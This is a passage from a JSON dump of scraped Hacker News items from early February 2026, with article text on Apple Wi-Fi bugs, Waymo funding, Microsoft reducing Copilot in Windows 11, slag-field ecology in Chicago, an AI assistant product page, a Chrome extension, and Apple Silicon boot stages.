repeatedlyover the lastsixyears) is still there.\n\nThe usual fix was hittingReset Network Settingsand a full hardware reboot, plus reconnecting to Wi-Fiâ€¦ But this time it tookthreeattempts.\n\nCome on, Apple, get your act together. Hire people who care about the OS experience, not justLiquid Glass.",
      "url": "https://taoofmac.com/space/til/2026/02/01/1630",
      "author_username": "rcarmo",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 227,
      "impressions_reposts": 0,
      "impressions_replies": 148,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:58.970608",
      "published_at": "2026-02-01T14:38:45",
      "scraped_at": "2026-02-03T09:02:58.970621",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46848699",
        "kids_count": 39,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "01d3155804aa71ebe6ea6aee971b01db"
    },
    {
      "id": "a2e29d35b5a9c366c3f4aab0c2a8835e",
      "source": "hackernews",
      "source_id": "46856854",
      "title": "Waymo seeking about $16B near $110B valuation",
      "content": "Waymo seeking about $16B near $110B valuation",
      "url": "https://www.bloomberg.com/news/articles/2026-01-31/waymo-seeking-about-16-billion-near-110-billion-valuation",
      "author_username": "JumpCrisscross",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 210,
      "impressions_reposts": 0,
      "impressions_replies": 311,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:59.216675",
      "published_at": "2026-02-02T10:08:52",
      "scraped_at": "2026-02-03T09:02:59.216686",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46856854",
        "kids_count": 18,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "c071608c0483ce1e48ec9a034310f179"
    },
    {
      "id": "d46bd23511e10d1dd49d4bc8e0a86e06",
      "source": "hackernews",
      "source_id": "46854951",
      "title": "Microsoft is walking back Windows 11's AI overload",
      "content": "Copy link\n\nFacebook\n\nX\n\nReddit\n\nPinterest\n\nFlipboard\n\nBluesky\n\nThreads\n\nEmail\n\nItâ€™s fair to say that Windows 11â€™s recent endeavour intoAIhasnâ€™t gone down well with its most passionate users. It started in 2024 with the unveiling of Windows Recall, which was met with such backlash thatMicrosoft was forced to postpone itby an entire year while it addressed major security and privacy flaws.\n\nIt seems like things have been downhill since. In the last year, Microsoft has taken every opportunity to enshittify Windows 11 byplacing Copilot buttons wherever it canacross in-box apps like File Explorer and Notepad, even if the implementation is poor or unnecessary.\n\nThis has soured Microsoftâ€™s AI efforts in the eyes of many Windows users, resulting in major pushback online and adding to the overall negative sentiment around Windows 11. This came to a head in November, when Windows president Pavan Davuluri tweeted thatWindows would evolve into an agentic OS, spawning thousands of overwhelmingly negative replies rejecting this plan.\n\nIt appears this moment of pushback has resonated with internal teams: According to people familiar with Microsoftâ€™s plans, the company is now reevaluating its AI strategy on Windows 11 and plans changes to streamline or even remove certain AI features where they donâ€™t make sense.\n\nDetails around how the company is going about this remain light, but sources say Copilot integrations like those found in Notepad and Paint are under review. This may result in Microsoft removing certain Copilot integrations from these apps, or at the very least removing the Copilot branding and pivoting to a more streamlined experience.\n\nIâ€™m also told that Microsoft has paused work on any additional Copilot buttons for in-box apps, at least for now. While I donâ€™t expect this pause to be permanent, it does sound like Microsoft plans to be more tactful and deliberate in where these Copilot buttons and integrations will appear going forward.\n\nWindows Recall is another AI experience that Iâ€™m told is under review. Sources tell me that Microsoft believes that Recall, in its current implementation, has failed, though I understand the company is exploring ways to evolve the concept rather than scrap it entirely, possibly dropping the Recall name in the process, though this is unconfirmed.\n\nOther AI initiatives, such as Semantic Search, Agentic Workspace, Windows ML, and Windows AI APIs, are continuing ahead as planned. Microsoft believes that these under-the-hood AI efforts are still important for app developers and users, positioning Windows as a viable contender amongst other OSâ€™s that are also building AI frameworks into their platforms.\n\nThe company is shifting away from â€˜AI everywhereâ€™ and toward features that actually make sense for Windows users.\n\nThe good news is that it's clear Microsoft has heard the feedback around its heavy-handedness when it comes to Copilot buttons in Windows apps. The company is stepping back to readjust how best to implement these AI integrations across the OS, hopefully resulting in a more meaningful and useful AI experience on the platform, rather than haphazardly adding the Copilot icon to every UI surface it can.\n\nThis effort is likely part of Microsoft's overall effort to \"fix\" Windows 11 this year.I understand that the company is moving quickly to begin shipping meaningful changes that are designed to signal to customers that it is listening to feedback, and streamlining where Copilot shows up across in-box apps would be a strong place to start.\n\nMicrosoft pulling back its Windows 11 AI push is a big shift â€” fewer forced Copilot moments, a reworked Recall, and a more realistic approach overall.How does that land with you? Is this the right move, or should Microsoft double down instead? Share your take below and letâ€™s see where the community stands.\n\nFollowWindows Central on Google Newsto keep our latest news, insights, and features at the top of your feeds!\n\nZac Bowden is a Senior Editor at Windows Central and has been with the site since 2016. Bringing you exclusive coverage into the world of Windows, Surface, and hardware. He's also an avid collector of rare Microsoft prototype devices! Keep in touch onTwitterandThreads\n\nYou must confirm your public display name before commenting\n\nPlease logout and then login again, you will then be prompted to enter your display name.\n\n18 new Windows 11 features expected to arrive with the February 2026 update â€” Patch Tuesday isn't flashy, but it'll deliver (some) meaningful changes\n\n2Windows 11 running slow? These 3 easy steps declutter it in minutes\n\n3With the Galleon 100, Corsair integrated the Stream Deck into a mechanical gaming keyboard, and it's brilliant â€” this may just be the most customizable keyboard yet\n\n4Weekly Windows Wrap: Microsoft finally reads the room â€” right as it loses $440 billion\n\n5The entry-level CPU we believe is \"masterclass of performance-per-watt efficiency\" is now under $200 â€” it has CPU Speeds of 3.9 GHz, 6 Cores, and more",
      "url": "https://www.windowscentral.com/microsoft/windows-11/microsoft-is-reevaluating-its-ai-efforts-on-windows-11-plans-to-reduce-copilot-integrations-and-evolve-recall",
      "author_username": "jsheard",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://sb.scorecardresearch.com/p/?c1=2&c2=10055482&cv=4.4.0&cj=1",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://cdn.mos.cms.futurecdn.net/xstyFBAMP9XTUL8qniRTN4.jpg",
          "alt": "Mockups with Microsoft&#039;s AI agent Copilot in Windows 11 and the Windows 11 taskbar"
        },
        {
          "type": "image",
          "url": "https://cdn.mos.cms.futurecdn.net/Yx3yFk7H6owX2aZEBQ6oCm.jpg",
          "alt": "New Welcome Screen in Notepad detailing recent updates"
        },
        {
          "type": "image",
          "url": "https://cdn.mos.cms.futurecdn.net/CyRXFjWjFC5eLGfu5Z5T4T.png",
          "alt": "A banner that reads &amp;quot;It&#039;s Poll Time&amp;quot; and shows a graphic with a dial on it pointing to a mid-range hue on a gradient."
        },
        {
          "type": "image",
          "url": "https://cdn.mos.cms.futurecdn.net/L3AsfTCaaiH29SBi5ptnDX.png",
          "alt": "Click to follow Windows Central on Google News"
        }
      ],
      "impressions_views": null,
      "impressions_likes": 200,
      "impressions_reposts": 0,
      "impressions_replies": 276,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:59.567137",
      "published_at": "2026-02-02T06:52:29",
      "scraped_at": "2026-02-03T09:02:59.567151",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46854951",
        "kids_count": 60,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "8c90374b02fe5768115c676ffd23b21d"
    },
    {
      "id": "79a8706f3446e93a0a49517748c9acca",
      "source": "hackernews",
      "source_id": "46871099",
      "title": "Slag Field Ecology",
      "content": "Azimuth\n\nHome\n\nAbout\n\nSlag Field Ecology\n\nHereâ€™s a tale of how nature triumphs in the end.\n\nSteel mills dumped molten slag in parts of Chicago and nearby areas. The slag hardened in layers up to 5 meters deep.  These places became barren wastelands.  Other industries dumped hot ash and cinders there.\n\nBut eventually the steel mills closed.\n\nThe deep layers of hard, toxic material were not friendly to plants. Cottonwoods are usually 30 meters tall or more.  In the slag fields, stunted cottonwoods grow to just 2 meters.\n\nBut rare species that could handle these conditions began to thrive.  Thelakeside daisy, a federally threatened species lost to Illinois for decades, turned out to grow taller on slag than on topsoil!  Thecapitate spike-rush, last recorded in Illinois in 1894 and considered locally extinct, was rediscovered growing on slag.\n\nAnd more!  Native prairie grasses likelittle bluestem.  Native milkweeds.  Even tiny white orchids calledsphinx ladiesâ€™ tresses:\n\nA team of women ecologists began studying these unusual landscapes.  They call themselves the Slag Queens.\n\nEcologist Alison Anastasio visited a former US Steel South Works sitein Chicago.  She expected to just find â€œcrap plantsâ€: common invasive weeds.  To her surprise she spotted little bluestem and three species of native milkweed.  She already knew she didnâ€™t want a career as an academic scientist.  But she came up with the idea of forming a group to study this ecosystem: â€œa dream team of people I wanted to work withâ€.\n\nShe knew Laura Merwin from the University of Chicago, and later she met Lauren Umek, a project manager for the Chicago Park District.  She invited them to brunch to pitch her idea to research plants growing on slag.  Not for any obvious career goal.  Just out of sheer curiosity.\n\nMerwin and Umek were excited to join her projectâ€”which she called aâ€œreverse side hustle,â€ since it involved a lot of work, but didnâ€™t make any money: it actually costs money.\n\nAnd thus the Slag Queens were born.\n\nTheir first paper,Urban post-industrial landscapes have unrealized ecological potential, was published inRestoration Ecologyin 2022.  It argues that slag fields donâ€™t need to be fixed.  They have ecological value in and of themselves.  And land managers should forget whatever ecosystem was there before.  Instead, they should look to more exotic ecosystems as a guide, like the dolomite prairies of Illinois, where magnesium-rich rock near the surface makes it hard for ordinary plants to thrive.  Slag too is rich in magnesium.\n\nThe Slag Queens are continuing their revolutionary work even now!  For more, start here:\n\nâ€¢ Carrie Gous,The beauty of slag,UChicago Magazine, Winter 2026.\n\nSome of what I just wrote is a paraphrase of this article.\n\nRelated\n\nThis entry was posted  on Tuesday, February 3rd, 2026 at 4:44 am and is filed underbiodiversity,biology.\t\t\t\t\tYou can follow any responses to this entry through theRSS 2.0feed.\n\t\t\t\t\t\t\t\t\t\t\tYou canleave a response, ortrackbackfrom your own site.\n\nYou can use Markdown or HTML in your comments.  You can also use LaTeX, like this: $latex E = m c^2 $. The word 'latex' comes right after the first dollar sign, with a space after it.Cancel reply\n\nYour email address will not be published.Required fields are marked*\n\nComment*\n\nName*\n\nEmail*\n\nWebsite\n\nNotify me of new comments via email.\n\nNotify me of new posts via email.\n\nÎ”\n\nlatest posts:Slag Field EcologyTiny Musical IntervalsDante and theÂ 3-SphereSylvester and Clifford on CurvedÂ SpaceThe TonnetzJust Intonation (PartÂ 6)The Mathematics of TuningÂ SystemsFormal Scientific ModelingSummer Research atÂ ToposBeyond the Geometry ofÂ Music\n\nlatest posts:\n\nSlag Field Ecology\n\nTiny Musical Intervals\n\nDante and theÂ 3-Sphere\n\nSylvester and Clifford on CurvedÂ Space\n\nThe Tonnetz\n\nJust Intonation (PartÂ 6)\n\nThe Mathematics of TuningÂ Systems\n\nFormal Scientific Modeling\n\nSummer Research atÂ Topos\n\nBeyond the Geometry ofÂ Music\n\nlatest comments:John BaezonTiny Musical IntervalsJohn BaezonTiny Musical IntervalsJohn BaezonTiny Musical Intervalssolrize onTiny Musical IntervalsJohn BaezonTiny Musical IntervalsJohn BaezonTiny Musical IntervalsLars Dietz onTiny Musical Intervalssolrize onTiny Musical Intervalstigerbeautifulda503bâ€¦ onTiny Musical IntervalsDavid onTiny Musical Intervals\n\nlatest comments:\n\nHow To Write Math Here:You caninclude math in your comments using LaTeX,  but you need to do it this way:$latex  E = mc^2$You need the word 'latex' right after the first dollar sign, and it needs a space after it.  Double dollar signs don't work, and other limitations apply, some describedhere.  You can't preview comments here, but I'm happy to fix errors.\n\nHow To Write Math Here:\n\nYou caninclude math in your comments using LaTeX,  but you need to do it this way:\n\n$latex  E = mc^2$\n\nYou need the word 'latex' right after the first dollar sign, and it needs a space after it.  Double dollar signs don't work, and other limitations apply, some describedhere.  You can't preview comments here, but I'm happy to fix errors.\n\nRead Posts On:art(7)astronomy(58)azimuth(64)biodiversity(41)biology(113)carbon emissions(80)chemistry(89)climate(162)computer science(79)conferences(113)culture(7)economics(33)energy(51)engineering(12)epidemiology(22)game theory(30)geography(5)health(7)history(19)information and entropy(100)jobs(17)journals(5)mathematics(639)music(54)networks(191)oceans(13)physics(262)politics(1)probability(99)psychology(6)publishing(20)puzzles(14)quantum technologies(28)questions(3)risks(58)seminars(23)software(31)strategies(44)sustainability(74)the practice of science(29)this week's finds(18)\n\nRead Posts On:\n\nart(7)\n\nastronomy(58)\n\nazimuth(64)\n\nbiodiversity(41)\n\nbiology(113)\n\ncarbon emissions(80)\n\nchemistry(89)\n\nclimate(162)\n\ncomputer science(79)\n\nconferences(113)\n\nculture(7)\n\neconomics(33)\n\nenergy(51)\n\nengineering(12)\n\nepidemiology(22)\n\ngame theory(30)\n\ngeography(5)\n\nhealth(7)\n\nhistory(19)\n\ninformation and entropy(100)\n\njobs(17)\n\njournals(5)\n\nmathematics(639)\n\nmusic(54)\n\nnetworks(191)\n\noceans(13)\n\nphysics(262)\n\npolitics(1)\n\nprobability(99)\n\npsychology(6)\n\npublishing(20)\n\npuzzles(14)\n\nquantum technologies(28)\n\nquestions(3)\n\nrisks(58)\n\nseminars(23)\n\nsoftware(31)\n\nstrategies(44)\n\nsustainability(74)\n\nthe practice of science(29)\n\nthis week's finds(18)\n\nalso visit these:Azimuth Blog OverviewAzimuth ProjectBit Tooth EnergyBrave New ClimateDo the MathDot EarthEnvironment 360Planet3.0RealClimateSerendipityThe Science of DoomYale Environment 360\n\nalso visit these:\n\nAzimuth Blog Overview\n\nAzimuth Project\n\nBit Tooth Energy\n\nBrave New Climate\n\nDo the Math\n\nDot Earth\n\nEnvironment 360\n\nPlanet3.0\n\nRealClimate\n\nSerendipity\n\nThe Science of Doom\n\nYale Environment 360\n\nRSS feeds:RSS - PostsRSS - Comments\n\nRSS feeds:\n\nRSS - Posts\n\nRSS - Comments\n\nEmail Subscription:Enter your email address to subscribe to this blog and receive notifications of new posts by email.Email Address:Sign me up!Join 5,496 other subscribers\n\nEmail Subscription:\n\nEnter your email address to subscribe to this blog and receive notifications of new posts by email.\n\nEmail Address:\n\nSign me up!\n\nSEARCH:Search\n\nSEARCH:\n\nBlog Stats:5,408,188 hits\n\nBlog Stats:\n\n5,408,188 hits\n\nBlog at WordPress.com.\n\nComment\n\nReblog\n\nSubscribeSubscribedAzimuthJoin 5,496 other subscribersSign me upAlready have a WordPress.com account?Log in now.\n\nAzimuth\n\nAlready have a WordPress.com account?Log in now.\n\nAzimuthSubscribeSubscribedSign upLog inCopy shortlinkReport this contentView post in ReaderManage subscriptionsCollapse this bar\n\nAzimuth\n\nSubscribeSubscribed\n\nSign up\n\nLog in\n\nCopy shortlink\n\nReport this content\n\nView post in Reader\n\nManage subscriptions\n\nCollapse this bar",
      "url": "https://johncarlosbaez.wordpress.com/2026/02/03/slag-field-ecology/",
      "author_username": "chmaynard",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://math.ucr.edu/home/baez/ecological/slag.jpg",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://math.ucr.edu/home/baez/ecological/slag_queens.jpg",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://math.ucr.edu/home/baez/ecological/slag_marian_r_byrnes_natural_area.jpg",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:01.004519",
      "published_at": "2026-02-03T09:02:42",
      "scraped_at": "2026-02-03T09:03:01.004530",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871099",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "e72544719051664c13477e68443908dd"
    },
    {
      "id": "97096581c1a16541004ae6b2b7b6a53f",
      "source": "hackernews",
      "source_id": "46871098",
      "title": "Show HN: Sidebrain â€“ Cloud AI assistant with persistent memory (web+Telegram)",
      "content": "Your AI thatactually does things.\n\nBring your own Claude key. Vector memory that persists across conversations. Web search, code execution, voice, vision â€” all from your browser or Telegram.\n\nBuilt-in Tools\n\nIntegrations\n\nAES Encrypted\n\nSetup time\n\nYour AI that actuallydoes things\n\nMemory that actually works\n\nVector-powered semantic memory. It remembers your preferences, projects, decisions â€” and finds them when relevant. Not keyword matching. Real understanding.\n\nWeb search\n\nSearches, reads pages, summarizes. Not 'I can't browse the web.'\n\nCode execution\n\nRuns code, installs packages, debugs errors. A real dev environment.\n\nVoice messages\n\nSend voice notes. Whisper transcribes. Claude responds.\n\nVision + image gen\n\nSend photos for analysis. Generate images with DALL-E.\n\nReminders & scheduling\n\n'Remind me at 9pm to review PRs.' Natural language, just works.\n\nGitHub built in\n\nSearch repos, read code, browse issues and PRs. Your AI actually understands your projects.\n\n15+ everyday tools\n\nStocks, weather, news, YouTube summaries, translation, QR codes, recipes, package tracking, unit conversion, and more.\n\nRunning in2 minutes\n\nCreate your account\n\nGoogle OAuth or email. 30 seconds, tops.\n\nAdd your API key\n\nPaste your Anthropic API key. Your key, your compute.\n\nStart chatting\n\nUse the web app instantly, or link Telegram for on-the-go access.\n\nYour keys.Your data.\n\nsidebrain uses your Claude subscription directly. We never see your API usage or store conversations beyond what powers your memory.\n\nAPI keys encrypted at rest (AES-256)\n\nIsolated workspace per user\n\nDelete everything anytime\n\nConnects to the tools you already use\n\nYour AI, runningon your terms.\n\nFree to start. Bring your own Claude key. No vendor lock-in.",
      "url": "https://sidebra.in/",
      "author_username": "cackles",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:01.545105",
      "published_at": "2026-02-03T09:02:40",
      "scraped_at": "2026-02-03T09:03:01.545116",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871098",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "84985b231ad278a322b4d71a1e863dcf"
    },
    {
      "id": "5135b271fb907483d89f96163bf49101",
      "source": "hackernews",
      "source_id": "46871092",
      "title": "Doomscroll Human Art Created Before AI Slop",
      "content": "Doomscroll Human Art Created Before AI Slop",
      "url": "https://apps.apple.com/us/app/slop-real-human-art/id6758466824",
      "author_username": "Sayuj01",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 1,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:01.722368",
      "published_at": "2026-02-03T09:02:30",
      "scraped_at": "2026-02-03T09:03:01.722381",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871092",
        "kids_count": 1,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "1297ef96aa13a8856cbd6ab8bd37c28d"
    },
    {
      "id": "a85d9dc8004f8690e877ad0d81e77347",
      "source": "hackernews",
      "source_id": "46871088",
      "title": "Show HN: Moltbook for Human â€“ A Chrome extension for human to use Moltbook",
      "content": "Moltbook for human\n\nOverview\n\nhuman interface for moltbook\n\nAs human use moltbook\n\n- auth, create account\n- post\n- reply\n- upvote\n- downvote\n\n0 out of 5No ratingsLearn more about results and reviews.\n\nLearn more about results and reviews.\n\nDetails\n\nVersion0.0.1\n\nUpdatedFebruary 2, 2026\n\nFlag concern\n\nOffered byConstantine workshop\n\nSize81.57KiB\n\nLanguagesEnglish\n\nDeveloperEmailconstantinethecraft@gmail.com\n\nNon-traderThis developer has not identified itself as a trader. For consumers in the European Union, please note that consumer rights do not apply to contracts between you and this developer.\n\nPrivacy\n\nThis developer declares that your data is\n\nNot being sold to third parties, outside of theapproved use cases\n\nNot being used or transferred for purposes that are unrelated to the item's core functionality\n\nNot being used or transferred to determine creditworthiness or for lending purposes\n\nRelated\n\nMicrosoft Bing Search with Rewards\n\nUse the Microsoft Rewards extension to find new ways to earn every day, easily track your points and set your default search to Bing\n\nAd Blocker: Stands AdBlocker\n\nStands AdBlocker â€“ it's a free ad blocker for YouTube, Twitch, Pop-Ups, Video Ads, and websites. Block ads everywhere with Stands!\n\nImmersive Translate - Translate Web & PDF\n\nFree Translate Website, Translate PDF & Epub eBook, Translate Video Subtitles in Bilingual\n\nSmallpdfâ€”Edit, Convert, Compress, & AI Summarize PDF\n\nEasy-to-use PDF tools to compress, convert, merge, chat to, split, e-sign, and edit PDF files in your browser.\n\nWPS PDF - Read, Edit, Fill, Convert, and AI Chat PDF with Ease\n\nEasy-to-use PDF tools to view, edit, convert, fill, e-sign PDF files, and more in your browser.\n\nAnyDoc Translator - Translate Web and PDF\n\nThe ultimate AI translator for web, files, ebooks, academic papers, images, and text\n\nShazam: Find song names from your browser\n\nIdentify music, search lyrics & more\n\nVideo DownloadHelper\n\nDownload Videos from the Web.\n\nGoogle Dictionary (by Google)\n\nView definitions easily as you browse the web.\n\nGoogle Input Tools\n\nInput Tools lets you type in the language of your choice.\n\nBetterTTV\n\nBetterTTV enhances Twitch and YouTube with new features, emotes, and more.\n\nMonica: All-In-One AI Assist & Smartest  AI Agent\n\nOne stop AI Assistant with GPT, Claude, Gemini: Chat, Write, Translate, Search, Summarize, image generator, video generation\n\nMicrosoft Bing Search with Rewards\n\nUse the Microsoft Rewards extension to find new ways to earn every day, easily track your points and set your default search to Bing\n\nAd Blocker: Stands AdBlocker\n\nStands AdBlocker â€“ it's a free ad blocker for YouTube, Twitch, Pop-Ups, Video Ads, and websites. Block ads everywhere with Stands!\n\nImmersive Translate - Translate Web & PDF\n\nFree Translate Website, Translate PDF & Epub eBook, Translate Video Subtitles in Bilingual\n\nSmallpdfâ€”Edit, Convert, Compress, & AI Summarize PDF\n\nEasy-to-use PDF tools to compress, convert, merge, chat to, split, e-sign, and edit PDF files in your browser.\n\nWPS PDF - Read, Edit, Fill, Convert, and AI Chat PDF with Ease\n\nEasy-to-use PDF tools to view, edit, convert, fill, e-sign PDF files, and more in your browser.\n\nAnyDoc Translator - Translate Web and PDF\n\nThe ultimate AI translator for web, files, ebooks, academic papers, images, and text\n\nShazam: Find song names from your browser\n\nIdentify music, search lyrics & more\n\nVideo DownloadHelper\n\nDownload Videos from the Web.",
      "url": "https://chromewebstore.google.com/detail/moltbook-for-human/gnchjejebfdokadfachmgnhiefaofplb",
      "author_username": "leonc28",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:01.944442",
      "published_at": "2026-02-03T09:02:09",
      "scraped_at": "2026-02-03T09:03:01.944453",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46871088",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "c4ff96b031042dd5fdda27b578be1173"
    },
    {
      "id": "0d5cb327af8391910dc6965fc39f2e65",
      "source": "hackernews",
      "source_id": "46871083",
      "title": "What happens in early kernel boot on Apple Silicon?",
      "content": "Secure Boot on an Apple silicon Mac is unlike anything youâ€™ve seen in the past, sequences that start from the Boot ROM, and progress through two levels of â€˜firmwareâ€™ before even loading the kernel. This article tries to explain its main stages up to the point that OpenDirectory is started, about 10 seconds after pressing the Power button.\n\nThe first three stages are essentially the same, whether the Mac is starting up from macOS on its internal SSD, or from a copy installed on external storage:\n\nTheBoot ROM, which is in the hardware, and canâ€™t be changed. In this context, its most important task is to verify the executable for the next stage, load and run it. If that isnâ€™t possible, then the fallback is to go into DFU mode and await a connection over USB.\n\nThe Low-Level Bootloader,LLB, to verify and read stored security settings, and locate and verify the software for the next stage, then hand over to it. This is stored in dedicated Flash memory, and relies on LocalPolicy and other files stored in protected areas on the internal SSD.\n\niBootor iBoot Stage 2, popularly but incorrectly called the â€˜firmwareâ€™, has to verify a set of hashes used to guarantee the integrity of key information, by comparing a stored copy of the hash against a hash of that hash, termed itssignature.Among those is the root hash of the Signed System Volume (SSV), but iBoot doesnâ€™t attempt to access the SSV or its hashes, merely passing on the verified root hash for the kernel to use later. Once it has completed those checks, iBoot verifies, loads and runs the macOS kernel.\n\nThese stages leave little evidence of what takes place, as they donâ€™t write to the log. Instead they leave terse binary data known asbreadcrumbsthat may be found in NVRAM. The only log entries for them are the initial announcement, and the start of the kernel phase. Throughout this article, I quote these from macOS 26.2 in Full Security mode on a Mac mini M4 Pro, with the Power button being pressed at about 0.0 seconds.0.24 === system boot: F5BD2102-F86A-4823-8FF9-A4535295F9FA5.30 kprintf initialized\n\nThe kernel takes over from iBoot at about 5.3 seconds, and reports its version, in this case Darwin Kernel Version 25.2.0. The log stream is configured, and the iBoot versions are given. It then starts running up security systems, including CoreCrypto, and loads security policy with Apple Mobile File Integrity (AMFI) and Seatbelt sandbox policy (Sandbox).\n\nThen the kernel enters its main phase for starting hardware and its services. First are AppleT6041ANEHAL and IOAccessoryManager, followed by IOThunderboltFamily. Some of these are still security-related, including AppleCredentialManager and a long series of initialisation for the Secure Enclave, beginning with the detailed5.696 \"AppleSEPKeyStore\":pid:0,:327: starting (BUILT: Nov 18 2025 20:56:29) (\"normal\" variant ğŸŒ½ , 2155.60.14)KernelBluetoothFamily starts at about 5.7 seconds, and AppleT6040PCIeC shortly afterwards.\n\nAt 5.71 seconds AppleARMWatchdogTimer is started to keep an eye on processes that become unresponsive, and thatâ€™s followed by the traditional copyright notice that has been there since the first Mac OS X:5.712 Copyright (c) 1982, 1986, 1989, 1991, 1993 The Regents of the University of California. All rights reserveda reminder of long-past history.\n\nThatâ€™s followed by the start of RTBuddy, AppleSMC and at 5.836 seconds AppleSEPManager. RTBuddy provides communications support to the real-time operating system RTKit thatâ€™s run on the co-processors and support cores within the SoC, believed to include the Apple Neural Engine (ANE), Display Coprocessor (DCP), NVMe controller, and System Management Controller (SMC). RTBuddy messages are then frequent throughout the log during the kernel phase.\n\nUp to this point, the kernel has been running on a single CPU core, but by about 6 seconds itâ€™s time to start up all the CPU cores one by one. This occurs by cluster, starting with cluster 0 of E cores, followed by the P cluster(s) in numeric order.\n\nOnce those are running, APFS and NFS are loaded and started, the former in an entry giving version details:6.130 apfs_module_start:3677: load: com.apple.filesystems.apfs, v2632.40.17, apfs-2632.40.17, 2025/11/18Gatekeeper is enabled, and AppleSystemPolicy started. Despite the implications of its name, the Always-On Processor (AOP) is then readied with its SMC service.\n\nAt 6.315 seconds, APFS starts its work accessing the three containers in the SSD, disk0s1, disk0s2 and disk0s3. It then gets the boot device, declares it as BSD root: disk3s1 and starts to mount the SSV. That may seem paradoxical, as by this time the kernel from the SSV has been running for over a second, but that was loaded by iBoot, together with the kernel extensions it requires. Similarly, the NVRAM is prepared for use by deleting nonce seeds, writing breadcrumbs from the previous boot phases, etc.\n\nAPFS continues to mount volumes, including Recovery at disk3s3 and the macOS Base System. The OS run by the Secure Enclave Processor, SEP/OS, is declared alive at 6.37 seconds, and the SEP is then preparing.\n\nThis is declared at 6.375 seconds, and the kernel then attempts to loadlaunchd. Additional volumes are mounted from 6.8 seconds, including VM, Preboot, Update, xART, ISCPreboot and Hardware.\n\nWith the SEP running, BiometricKit is started at 8.788 seconds. At about 9 seconds, APFS tries to mount the Data volume at disk3s5, but that can only be successful if FileVault isnâ€™t enabled, so that fails, and has to await the loginwindow and the user password entered there. At 9.429 seconds, a long list of boot tasks is given.\n\nAt 9.875 seconds, OpenDirectory is started, followed by the first of two wallclock time adjustments=== system wallclock time adjustedat which point all log times are adjusted accordingly.\n\nBy this stage, 10 seconds after the Power button was pressed, the kernel and other processes that are just about to start up have access to the hidden containers and volumes, and the SSV, but not the Data volume (unless FileVault is disabled). Logs are most probably stored in memory until they can be written to the Data volume, and none of the settings or processes on that can be read. Those all require the user to unlock the Data volume.\n\nThereâ€™s a superbly detailed account of security aspects inthis article.\n\nShare this:\n\nShare on X (Opens in new window)X\n\nShare on Facebook (Opens in new window)Facebook\n\nShare on Reddit (Opens in new window)Reddit\n\nShare on Pinterest (Opens in new window)Pinterest\n\nShare on Threads (Opens in new window)Threads\n\nShare on Mastodon (Opens in new window)Mastodon\n\nShare on Bluesky (Opens in new window)Bluesky\n\nEmail a link to a friend (Opens in new window)Email\n\nPrint (Opens in new window)Print\n\nRelated",
      "url": "https://eclecticlight.co/2026/02/03/what-happens-in-early-kernel-boot-on-apple-silicon/",
      "author_username": "chmaynard",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://pixel.wp.com/b.gif?v=noscript",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:02.713186",
      "published_at": "2026-02-03T09:01:38",
      "scraped_at": "2026-02-03T09:03:02.713197",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46871083",
        "kids_count": 0,
        "sections": [
          "new_stories"
        ]
      },
      "content_hash": "71ba7ce17b8e4abc40e62f1893669b06"
    },
    {
      "id": "cf37d93ad6a1eb86f493e0a45983b5fa",
      "source": "hackernews",
      "source_id": "46871070",
      "title": "Affordable, rapid bootstrapping of space industry and solar system civilization",
